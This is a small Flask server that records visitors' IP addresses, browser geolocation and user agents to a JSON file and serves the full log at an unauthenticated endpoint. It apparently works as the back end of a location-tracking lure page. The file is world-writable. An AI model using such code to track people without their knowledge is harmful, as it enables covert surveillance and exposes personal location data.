from flask import Flask, jsonify, request, render_template
from datetime import datetime
import json
import os

app = Flask(__name__)

# Configurações robustas para o arquivo de logs
LOG_DIR = os.path.join(os.getcwd(), 'logs')
LOG_FILE = os.path.join(LOG_DIR, 'logs.json')

def setup_log_system():
    """Configura o sistema de logs com tratamento de erros"""
    try:
        # Cria o diretório se não existir
        os.makedirs(LOG_DIR, exist_ok=True)
        
        # Cria o arquivo de logs se não existir
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'w') as f:
                json.dump([], f)
            
        # Verifica permissões de escrita
        if not os.access(LOG_FILE, os.W_OK):
            os.chmod(LOG_FILE, 0o666)
            
    except Exception as e:
        print(f"ERRO NA CONFIGURAÇÃO: {str(e)}")
        raise

def get_client_ip():
    """Obtém o IP real do cliente mesmo com proxy"""
    for header in ('X-Forwarded-For', 'X-Real-IP'):
        if header in request.headers:
            return request.headers[header].split(',')[0].strip()
    return request.remote_addr

def save_to_log(ip, lat, lng):
    """Salva dados no log com tratamento robusto"""
    try:
        # Lê logs existentes
        logs = []
        if os.path.exists(LOG_FILE):
            try:
                with open(LOG_FILE, 'r') as f:
                    logs = json.load(f)
            except (json.JSONDecodeError, IOError) as e:
                print(f"ERRO AO LER LOG: {str(e)}")
                logs = []

        # Adiciona novo registro
        new_entry = {
            "ip": ip,
            "latitude": float(lat),
            "longitude": float(lng),
            "timestamp": datetime.now().isoformat(),
            "user_agent": request.headers.get('User-Agent', ''),
            "success": True
        }
        logs.append(new_entry)

        # Escreve no arquivo
        with open(LOG_FILE, 'w') as f:
            json.dump(logs, f, indent=2)
            
        return True
    except Exception as e:
        print(f"ERRO AO SALVAR: {str(e)}")
        return False

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/conteudo')
def content():
    return render_template('conteudo.html')

@app.route('/api/location', methods=['POST'])
def handle_location():
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                "status": "error",
                "message": "Dados não recebidos"
            }), 400

        ip = get_client_ip()
        lat = data.get('latitude')
        lng = data.get('longitude')

        if None in (lat, lng):
            return jsonify({
                "status": "error",
                "message": "Latitude ou longitude faltando"
            }), 400

        if save_to_log(ip, lat, lng):
            return jsonify({"status": "success"})
        else:
            return jsonify({
                "status": "error",
                "message": "Falha ao salvar no servidor"
            }), 500

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Erro interno: {str(e)}"
        }), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    try:
        if not os.path.exists(LOG_FILE):
            return jsonify({"logs": []})

        with open(LOG_FILE, 'r') as f:
            return jsonify({"logs": json.load(f)})
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Erro ao ler logs: {str(e)}"
        }), 500

if __name__ == '__main__':
    setup_log_system()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
